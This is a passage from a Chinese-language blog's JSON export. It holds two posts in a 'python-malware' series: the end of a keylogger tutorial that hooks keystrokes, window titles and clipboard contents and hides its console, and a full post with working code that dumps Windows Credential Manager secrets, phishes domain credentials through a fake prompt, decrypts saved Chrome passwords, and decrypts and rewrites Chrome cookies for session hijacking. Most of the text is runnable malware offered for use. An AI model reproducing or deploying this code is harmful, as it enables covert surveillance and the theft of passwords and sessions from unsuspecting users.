class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hook</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#用于安装/卸载钩子</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\">#调用user32.dll和kernel32.dll</span></span><br><span class=\"line\">        self.user32 = user32</span><br><span class=\"line\">        self.kernel32 = kernel32</span><br><span class=\"line\">        self.is_hooked = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">install_hook</span><span class=\"params\">(self, ptr)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\">#安装钩子</span></span><br><span class=\"line\">        self.is_hooked = self.user32.SetWindowsHookExA(</span><br><span class=\"line\">            WH_KEYBOARD_LL,</span><br><span class=\"line\">            ptr,</span><br><span class=\"line\">            kernel32.GetModuleHandleW(<span class=\"literal\">None</span>),</span><br><span class=\"line\">            <span class=\"number\">0</span></span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.is_hooked:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">uninstall_hook</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\">#卸载钩子</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.is_hooked <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        self.user32.UnhookWindowsHookEx(self.is_hooked)</span><br><span class=\"line\">        self.is_hooked = <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<p><code>is_hooked</code>变量用于保存挂钩过程的句柄<code>SetWindowsHookExA</code>。<br><code>install_hook</code>方法用于安装钩子调用<code>SetWindowsHookExA</code><br><code>uninstall_hook</code>方法用于卸载钩子。测试键盘记录程序时使用</p>\n<h3 id=\"get-current-window-和get-clipboard\"><a href=\"#get-current-window-和get-clipboard\" class=\"headerlink\" title=\"get_current_window()和get_clipboard()\"></a>get_current_window()和get_clipboard()</h3><p>用到part1抓取窗口标题与剪贴板数据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_current_window</span><span class=\"params\">()</span>:</span>    <span class=\"comment\">#抓取当前窗口标题</span></span><br><span class=\"line\">    <span class=\"comment\">#必需的WinAPI函数</span></span><br><span class=\"line\">    GetForegroundWindow = user32.GetForegroundWindow</span><br><span class=\"line\">    GetWindowTextLength = user32.GetWindowTextLengthW</span><br><span class=\"line\">    GetWindowText = user32.GetWindowTextW</span><br><span class=\"line\"></span><br><span class=\"line\">    hwnd = GetForegroundWindow()    <span class=\"comment\">#获取当前窗口句柄</span></span><br><span class=\"line\">    length = GetWindowTextLength(hwnd)    <span class=\"comment\">#获取标题文本长度，将句柄乍为参数传递</span></span><br><span class=\"line\">    buff = ctypes.create_unicode_buffer(length + <span class=\"number\">1</span>)    <span class=\"comment\">#创建临时缓存buff用于存储标题文本</span></span><br><span class=\"line\"></span><br><span class=\"line\">    GetWindowText(hwnd, buff, length + <span class=\"number\">1</span>)    <span class=\"comment\">#获取窗口标题并存储在buff中</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> buff.value    <span class=\"comment\">#返回buff的值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_clipboard</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    CF_TEXT = <span class=\"number\">1</span>    <span class=\"comment\">#设置剪贴板格式</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GlobalLock/GlobalUnlock 参数与返回类型</span></span><br><span class=\"line\">    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\">    kernel32.GlobalLock.restype = ctypes.c_void_p</span><br><span class=\"line\">    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GetClipboardData的返回类型</span></span><br><span class=\"line\">    user32.GetClipboardData.restype = ctypes.c_void_p</span><br><span class=\"line\">    user32.OpenClipboard(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#所需剪贴板函数</span></span><br><span class=\"line\">    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable</span><br><span class=\"line\">    GetClipboardData = user32.GetClipboardData</span><br><span class=\"line\">    CloseClipboard = user32.CloseClipboard</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> IsClipboardFormatAvailable(CF_TEXT):    <span class=\"comment\">#如果CF_TEXT可用</span></span><br><span class=\"line\">            data = GetClipboardData(CF_TEXT)    <span class=\"comment\">#获取剪贴板数据的句柄</span></span><br><span class=\"line\">            data_locked = kernel32.GlobalLock(data)    <span class=\"comment\">#获取指向数据所在的内存位置的指针</span></span><br><span class=\"line\">            text = ctypes.c_char_p(data_locked)    <span class=\"comment\">#获取指向data_locked位置的char*(python中的字符串)指针</span></span><br><span class=\"line\">            value = text.value    <span class=\"comment\">#存储有用的值</span></span><br><span class=\"line\">            kernel32.GlobalUnlock(data_locked)    <span class=\"comment\">#递减锁计数</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> value.decode(<span class=\"string\">'utf-8'</span>)    <span class=\"comment\">#返回剪贴板的值</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        CloseClipboard()    <span class=\"comment\">#关闭剪贴板</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"键盘事件发生调用的钩子程序\"><a href=\"#键盘事件发生调用的钩子程序\" class=\"headerlink\" title=\"键盘事件发生调用的钩子程序\"></a>键盘事件发生调用的钩子程序</h3><p>声明全局变量，这样每次点击按键时被清空。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hook_procedure</span><span class=\"params\">(nCode, wParam, lParam)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">global</span> last_key</span><br><span class=\"line\">    <span class=\"keyword\">global</span> current_clipboard</span><br><span class=\"line\">    <span class=\"keyword\">global</span> line</span><br><span class=\"line\">    <span class=\"keyword\">global</span> current_window</span><br></pre></td></tr></table></figure>\n\n<p>与part1同，我们需要知道用户键入时当前窗口，以便我们如果使用检索到的数据。每当按下特定键里，我们可以使用函数来卸载钩子(此处为<code>CONTROL</code>)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> current_window != get_current_window():    <span class=\"comment\">#判断current_window内容不是当前打开的窗口</span></span><br><span class=\"line\">    current_window = get_current_window()    <span class=\"comment\">#将窗口标题放在current_window中</span></span><br><span class=\"line\">    logging.info(<span class=\"string\">'[WINDOW] '</span> + current_window)    <span class=\"comment\">#将当前窗口标题写入日志文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果你在测试时想卸载钩子，请删除下面注释</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) &amp; 0x8000:</span></span><br><span class=\"line\"><span class=\"string\">    hook.uninstall_hook()</span></span><br><span class=\"line\"><span class=\"string\">    return 0</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> nCode == HC_ACTION <span class=\"keyword\">and</span> wParam == WM_KEYDOWN:</span><br><span class=\"line\">    kb = KBDLLHOOKSTRUCT.from_address(lParam)</span><br><span class=\"line\">    user32.GetKeyState(VIRTUAL_KEYS[<span class=\"string\">'SHIFT'</span>])</span><br><span class=\"line\">    user32.GetKeyState(VIRTUAL_KEYS[<span class=\"string\">'MENU'</span>])</span><br><span class=\"line\">    state = (c_char * <span class=\"number\">256</span>)()</span><br><span class=\"line\">    user32.GetKeyboardState(byref(state))</span><br><span class=\"line\">    buff = create_unicode_buffer(<span class=\"number\">8</span>)</span><br><span class=\"line\">    n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, <span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"number\">0</span>)    <span class=\"comment\">#ToUnicode返回值：-1/一个死键,0/不进行任何转换,1/一个字符,&gt;=2/两个或多个字符</span></span><br><span class=\"line\">    key = wstring_at(buff)</span><br></pre></td></tr></table></figure>\n\n<p>这里的逻辑是，当按下一个键时，我们调用之前创建的类<code>from_address</code>来获取有关键盘事件的信息，并将其<code>kb</code>作为数据结构存储在变量中<code>KBDLLHOOKSTRUCT</code>。创建一个<code>state</code>大小为256的变量来保存所有256个虚拟键的状态。这里调用<code>GetKeyboardState()</code>函数来完成。然后我们声明一个<code>Buff</code>变量以创建Unicode字符缓冲区(具有wchar数据类型的值的数组)。我们使用<code>ToUnicode</code>函数将虚拟按键代码或键盘状态转换为Unicode字符，然后使用<code>wstring_at()</code>将字符存储为1个字符的Unicode字符串。</p>\n<p><code>ToUnicode</code>返回值存储在n中。每当按下一个键里钩子过程会存储一个返回值，我们可以使用它来确定是否记录字符。只要n大于0，我们就记录按下的键。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">if</span> n &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> kb.vkCode <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> VIRTUAL_KEYS.values():    <span class=\"comment\">#如果键入非特殊键，则加入line变量</span></span><br><span class=\"line\">            line += key</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> key, value <span class=\"keyword\">in</span> VIRTUAL_KEYS.items():    <span class=\"comment\">#如果键入特殊键，则记录特殊键名</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> kb.vkCode == value:</span><br><span class=\"line\">                logging.info(key)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> kb.vkCode == VIRTUAL_KEYS[<span class=\"string\">'RETURN'</span>]:    <span class=\"comment\">#如果键入RETURN，则记录并清除line变量</span></span><br><span class=\"line\">            logging.info(line)</span><br><span class=\"line\">            line = <span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_clipboard != get_clipboard():    <span class=\"comment\">#如果剪贴板中有新数据，则记录该数据</span></span><br><span class=\"line\">            current_clipboard = get_clipboard()</span><br><span class=\"line\">            logging.info(<span class=\"string\">'[CLIPBOARD] '</span> + current_clipboard + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> user32.CallNextHookEx(hook.is_hooked, nCode, wParam, lParam)    <span class=\"comment\">#将钩子信息传递给下个钩子过程CallNextHookEx</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"last\"><a href=\"#last\" class=\"headerlink\" title=\"last\"></a>last</h3><p>创建<code>hook</code>类实例，创建指针<code>ptr</code>，安装钩子<code>install_hook(ptr)</code>，等待钩子截获系统信息。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hook = hook()</span><br><span class=\"line\">ptr = HOOKPROC(hook_procedure)</span><br><span class=\"line\">hook.install_hook(ptr)</span><br><span class=\"line\">msg = MSG()</span><br><span class=\"line\">user32.GetMessageA(byref(msg), <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>用pyinstaller将文件打包成exe，可以用参数-w/–noconsole来隐藏dos窗口</p>\n<p>解决part1的cpu占用率高问题，但未解决右键复制获取剪粘板数据。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/2_1.png\" alt=\"part2_1\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/2_2.png\" alt=\"part2_2\"></p>\n<p>源代码已上传致<a href=\"https://github.com/yui77111/python-malware/blob/master/keylogger/part2.py\" target=\"_blank\" rel=\"noopener\">gayhub</a></p>\n"},{"title":"窃取凭据与cookie","description":"使用python窃取windows凭据与chrome cookie.","_content":"\n### 环境准备\n\n`python3`\n\n`pip install pypiwin32`\n\n### 导入所需要包\n\n导入所需包和模块，并创建一个常量，用来调用某些凭据管理器相关功能时使用。\n\n```python\nimport os\nimport io\nimport sqlite3\nimport shutil\nimport win32cred\nimport win32crypt\nimport win32api\nimport win32con\nimport pywintypes\n\nCRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC\n```\n\n### 从windows凭据管理器中存储通用凭据\n\n通用凭据是非域凭据。如果你在windows上使用Git并通过GitHub，Bitbucket，Gitlab等进行身份验证，则凭据将存储在CredMan中。\n\n首先导入枚举和读取凭据所需的功能。\n```python\ndef dump_credsman_generic():\n    CredEnumerate = win32cred.CredEnumerate\n    CredRead = win32cred.CredRead\n```\n然后，我们枚举存储在凭据管理器中的凭据，并将其放入`creds`变量中，该变量是一个元组。\n```python\ntry:\n    creds = CredEnumerate(None, 0)  # 枚举凭证\nexcept Exception:  # 避免在任何异常情况下崩溃\n    pass\n```\n现在，我们要遍历每个凭据集，再添加到`credentials`列表中。\n```python\ncredentials = []\n\nfor package in creds:\n    try:\n        target = package['TargetName']\n        creds = CredRead(target, CRED_TYPE_GENERIC)\n        credentials.append(creds)\n    except pywintypes.error:\n        pass\n```\n创建一个内存文本流，避免在磁盘上写文件，遍历`credentials`变量并将所需的数据写入文本流。\n```python\ncredman_creds = io.StringIO()  # 内存中文本流\n\nfor cred in credentials:\n    service = cred['TargetName']\n    username = cred['UserName']\n    password = cred['CredentialBlob'].decode('utf-8','ignore')\n\n    credman_creds.write('Service: ' + str(service) + '\\n')\n    credman_creds.write('Username: ' + str(username) + '\\n')\n    credman_creds.write('Password: ' + str(password) + '\\n')\n    credman_creds.write('\\n')\n\nreturn credman_creds.getvalue()\n```\n\n![3_1](https://yui77111.github.io/assets/images/article/python/3_1.png)\n\n### 询问提示域凭据\n\n通过社工方式，用`CredUIPromptForCredentials()`功能来显示一个对话框来询问用户，从而欺骗用户向我们提供其域凭据。\n\n```python\ndef ask_domain_credentials():\n    CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials\n\n    creds = []\n\n    try:\n        creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})\n    except Exception:\n        pass\n    return creds\n```\n\n![3_2](https://yui77111.github.io/assets/images/article/python/3_2.png)\n\n返回如下格式\n\n![3_3](https://yui77111.github.io/assets/images/article/python/3_3.png)\n\n### 存储保存在Chrome中的密码\n\n如果在保存凭据时未设置主密码，则访问数据库中的加密`Blob`可以使用`CrytUnprotectData`解密(因为windows上的Chrome使用`CrytUnprotectData WinAPI`函数对其进行加密，[参考](https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc))，只要它在当前用户上下文中完成即可。这意味着你不能只是获取数据库并在具有不同用户的另一台计算机上打开它。\nChrome密码存在Login Data在%localappdata%\\Google\\User Data\\Default\\目录中名为Login Data数据库中。可以用DB Brower看到数据库的结构。\n\n![3_4](https://yui77111.github.io/assets/images/article/python/3_4.png)\n\n我们想查询：`action_urls`，`username_value`和`password_value`。字段`password_value`包含一个加密的`Blob`，我们将使用以下代码对其进行解密。\n我们先制作数据库文件的本地副本，否则如果当Chrome正在运行，它将带有一个句柄并且数据库将被锁定。\n\n```python\ntry:\n    login_data = os.environ['localappdata'] + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'\n    shutil.copy2(login_data, './Login Data')  # 复制数据库到当前目录\n    win32api.SetFileAttributes('./Login Data',win32con.FILE_ATTRIBUTE_HIDDEN)  # 在文件操作过程中不可见\nexcept Exception:\n    pass\n\nchrome_credentials = io.StringIO()\n```\n现在，我们使用sqlite3库打开Login Data数据库的本地副本，并查询用户保存凭据。\n```python\ntry:\n    conn = sqlite3.connect('./Login Data', )                                        # 连接数据库\n    cursor = conn.cursor()                                                          # 创建一个游标来获取数据\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins') # 查询\n    results = cursor.fetchall()                                                     # 获取数据\n    conn.close()                                                                    # 关闭数据库文件，使其不会被进程锁定\n    os.remove('Login Data')  \n\"\"\"\n```\n遍历获取到的数据并使用WinAPI函数`CryptUnprotectData`解密密码，最后返回保存好的内存中的文本流。\n```python\n    for action_url, username_value, password_value in results:\n        password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] # 使用CryptUnprotectData解密\n        if password:                                                                       # 将凭据写进内存中的文本流\n            chrome_credentials.write('URL: ' + action_url + '\\n')\n            chrome_credentials.write('Username: ' + username_value + '\\n')\n            chrome_credentials.write('Password: ' + str(password) + '\\n')\n            chrome_credentials.write('\\n')\n    return chrome_credentials.getvalue()                                                   # 返回内存中的文本流\n\nexcept sqlite3.OperationalError as e:\n    print(e)\n    pass\n\nexcept Exception as e:\n    print(e)\n```\n\n![3_5](https://yui77111.github.io/assets/images/article/python/3_5.png)\n\n### 窃取Chrome Cookie\n\nChrome Cookie与存储在Chrome 的密码一样，为同目录下的Cookies文件并用`CryptProtectData`加密。但不同的是我们使用解密的cookie窃取整个数据库文件重写数据库内部的数据。然后，如果会话在服务器上尚未过期或用户尚未注销，则可以将该数据库上载到远程服务器，并在站点中用于进行身份验证。\n\n```python\nlogin_data = os.environ['localappdata'] + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'  # cookies文件路径\nshutil.copy2(login_data, './Cookies')  # 复制到当前路径\nwin32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)\ntry:\n    conn = sqlite3.connect('./Cookies')  # 连接\n    cursor = conn.cursor()\n    cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')  # 查询\n    results = cursor.fetchall()  # 获取\n\n    # 解密\n    for host_key, name, value, encrypted_value in results:\n        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()\n\n        # 使用解密的值更新文件\n        cursor.execute(\"UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?\"，(decrypted_value, host_key, name));\n\n    conn.commit()  # 保存改变\n    conn.close()  # 关闭文件，使其不被进程锁定\n\nexcept Exception as e:\n    print(e)\n    pass\n```\n\n原cookies文件\n\n![3_6](https://yui77111.github.io/assets/images/article/python/3_6.png)\n\n新生成cookies文件\n\n![3_7](https://yui77111.github.io/assets/images/article/python/3_7.png)\n\n\n源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/credentials and cookies/main.py)","source":"_posts/2019-08-23-窃取凭据与cookie.md","raw":"---\ntitle: 窃取凭据与cookie\ndescription: 使用python窃取windows凭据与chrome cookie.\ncategories:\n - python\ntags: \n - python\n - 渗透测试\n---\n\n### 环境准备\n\n`python3`\n\n`pip install pypiwin32`\n\n### 导入所需要包\n\n导入所需包和模块，并创建一个常量，用来调用某些凭据管理器相关功能时使用。\n\n```python\nimport os\nimport io\nimport sqlite3\nimport shutil\nimport win32cred\nimport win32crypt\nimport win32api\nimport win32con\nimport pywintypes\n\nCRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC\n```\n\n### 从windows凭据管理器中存储通用凭据\n\n通用凭据是非域凭据。如果你在windows上使用Git并通过GitHub，Bitbucket，Gitlab等进行身份验证，则凭据将存储在CredMan中。\n\n首先导入枚举和读取凭据所需的功能。\n```python\ndef dump_credsman_generic():\n    CredEnumerate = win32cred.CredEnumerate\n    CredRead = win32cred.CredRead\n```\n然后，我们枚举存储在凭据管理器中的凭据，并将其放入`creds`变量中，该变量是一个元组。\n```python\ntry:\n    creds = CredEnumerate(None, 0)  # 枚举凭证\nexcept Exception:  # 避免在任何异常情况下崩溃\n    pass\n```\n现在，我们要遍历每个凭据集，再添加到`credentials`列表中。\n```python\ncredentials = []\n\nfor package in creds:\n    try:\n        target = package['TargetName']\n        creds = CredRead(target, CRED_TYPE_GENERIC)\n        credentials.append(creds)\n    except pywintypes.error:\n        pass\n```\n创建一个内存文本流，避免在磁盘上写文件，遍历`credentials`变量并将所需的数据写入文本流。\n```python\ncredman_creds = io.StringIO()  # 内存中文本流\n\nfor cred in credentials:\n    service = cred['TargetName']\n    username = cred['UserName']\n    password = cred['CredentialBlob'].decode('utf-8','ignore')\n\n    credman_creds.write('Service: ' + str(service) + '\\n')\n    credman_creds.write('Username: ' + str(username) + '\\n')\n    credman_creds.write('Password: ' + str(password) + '\\n')\n    credman_creds.write('\\n')\n\nreturn credman_creds.getvalue()\n```\n\n![3_1](https://yui77111.github.io/assets/images/article/python/3_1.png)\n\n### 询问提示域凭据\n\n通过社工方式，用`CredUIPromptForCredentials()`功能来显示一个对话框来询问用户，从而欺骗用户向我们提供其域凭据。\n\n```python\ndef ask_domain_credentials():\n    CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials\n\n    creds = []\n\n    try:\n        creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})\n    except Exception:\n        pass\n    return creds\n```\n\n![3_2](https://yui77111.github.io/assets/images/article/python/3_2.png)\n\n返回如下格式\n\n![3_3](https://yui77111.github.io/assets/images/article/python/3_3.png)\n\n### 存储保存在Chrome中的密码\n\n如果在保存凭据时未设置主密码，则访问数据库中的加密`Blob`可以使用`CrytUnprotectData`解密(因为windows上的Chrome使用`CrytUnprotectData WinAPI`函数对其进行加密，[参考](https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc))，只要它在当前用户上下文中完成即可。这意味着你不能只是获取数据库并在具有不同用户的另一台计算机上打开它。\nChrome密码存在Login Data在%localappdata%\\Google\\User Data\\Default\\目录中名为Login Data数据库中。可以用DB Brower看到数据库的结构。\n\n![3_4](https://yui77111.github.io/assets/images/article/python/3_4.png)\n\n我们想查询：`action_urls`，`username_value`和`password_value`。字段`password_value`包含一个加密的`Blob`，我们将使用以下代码对其进行解密。\n我们先制作数据库文件的本地副本，否则如果当Chrome正在运行，它将带有一个句柄并且数据库将被锁定。\n\n```python\ntry:\n    login_data = os.environ['localappdata'] + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'\n    shutil.copy2(login_data, './Login Data')  # 复制数据库到当前目录\n    win32api.SetFileAttributes('./Login Data',win32con.FILE_ATTRIBUTE_HIDDEN)  # 在文件操作过程中不可见\nexcept Exception:\n    pass\n\nchrome_credentials = io.StringIO()\n```\n现在，我们使用sqlite3库打开Login Data数据库的本地副本，并查询用户保存凭据。\n```python\ntry:\n    conn = sqlite3.connect('./Login Data', )                                        # 连接数据库\n    cursor = conn.cursor()                                                          # 创建一个游标来获取数据\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins') # 查询\n    results = cursor.fetchall()                                                     # 获取数据\n    conn.close()                                                                    # 关闭数据库文件，使其不会被进程锁定\n    os.remove('Login Data')  \n\"\"\"\n```\n遍历获取到的数据并使用WinAPI函数`CryptUnprotectData`解密密码，最后返回保存好的内存中的文本流。\n```python\n    for action_url, username_value, password_value in results:\n        password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] # 使用CryptUnprotectData解密\n        if password:                                                                       # 将凭据写进内存中的文本流\n            chrome_credentials.write('URL: ' + action_url + '\\n')\n            chrome_credentials.write('Username: ' + username_value + '\\n')\n            chrome_credentials.write('Password: ' + str(password) + '\\n')\n            chrome_credentials.write('\\n')\n    return chrome_credentials.getvalue()                                                   # 返回内存中的文本流\n\nexcept sqlite3.OperationalError as e:\n    print(e)\n    pass\n\nexcept Exception as e:\n    print(e)\n```\n\n![3_5](https://yui77111.github.io/assets/images/article/python/3_5.png)\n\n### 窃取Chrome Cookie\n\nChrome Cookie与存储在Chrome 的密码一样，为同目录下的Cookies文件并用`CryptProtectData`加密。但不同的是我们使用解密的cookie窃取整个数据库文件重写数据库内部的数据。然后，如果会话在服务器上尚未过期或用户尚未注销，则可以将该数据库上载到远程服务器，并在站点中用于进行身份验证。\n\n```python\nlogin_data = os.environ['localappdata'] + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'  # cookies文件路径\nshutil.copy2(login_data, './Cookies')  # 复制到当前路径\nwin32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)\ntry:\n    conn = sqlite3.connect('./Cookies')  # 连接\n    cursor = conn.cursor()\n    cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')  # 查询\n    results = cursor.fetchall()  # 获取\n\n    # 解密\n    for host_key, name, value, encrypted_value in results:\n        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()\n\n        # 使用解密的值更新文件\n        cursor.execute(\"UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?\"，(decrypted_value, host_key, name));\n\n    conn.commit()  # 保存改变\n    conn.close()  # 关闭文件，使其不被进程锁定\n\nexcept Exception as e:\n    print(e)\n    pass\n```\n\n原cookies文件\n\n![3_6](https://yui77111.github.io/assets/images/article/python/3_6.png)\n\n新生成cookies文件\n\n![3_7](https://yui77111.github.io/assets/images/article/python/3_7.png)\n\n\n源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/credentials and cookies/main.py)","slug":"2019-08-23-窃取凭据与cookie","published":1,"date":"2021-04-21T07:29:10.966Z","updated":"2020-07-24T03:57:03.370Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknr54xhg000f8ot9sbzynzvx","content":"<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p><code>python3</code></p>\n<p><code>pip install pypiwin32</code></p>\n<h3 id=\"导入所需要包\"><a href=\"#导入所需要包\" 